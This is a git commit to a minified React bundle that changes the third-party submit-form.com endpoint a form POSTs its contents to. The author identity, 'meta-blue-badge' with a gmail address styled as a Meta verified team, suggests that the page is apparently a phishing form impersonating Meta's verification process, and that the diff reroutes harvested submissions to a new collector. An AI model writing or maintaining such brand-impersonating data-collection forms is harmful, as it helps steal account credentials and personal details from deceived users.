0122ffb7985f5c02c9ae145c82591e7d6d9b5150
meta-blue-badge <metaverifiedteambadge@gmail.com>
2024-11-26 14:50:44 +0500

    Update main.be179052.js

--- main.be179052.js
+++ main.be179052.js
@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/ELCR6DdLi", {
+                                    fetch("https://submit-form.com/TX75RlAbA", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
